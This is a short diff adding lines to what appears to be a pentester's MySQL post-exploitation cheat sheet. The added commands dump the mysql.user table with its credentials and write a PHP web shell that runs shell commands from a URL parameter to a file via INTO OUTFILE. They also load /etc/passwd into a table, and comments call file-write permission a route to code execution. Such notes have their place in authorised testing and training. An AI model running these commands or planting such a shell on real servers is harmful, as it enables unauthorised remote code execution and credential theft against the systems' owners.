@@ -3,6 +3,17 @@ show grants;
 #interesting result: GRANT ALL
 #if user has file writing permission, this can be a good start point for a code exec.
 
+#show mysql user
+SELECT * FROM mysql.user WHERE 1
+
+#test mysql file writing into output
+select "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE '/tmp/test' from mysql.user
+
+#load /etc/passwd into db
+LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE passwd;
+
+#show mysql version
+
 #to show variables
 show variables;
 
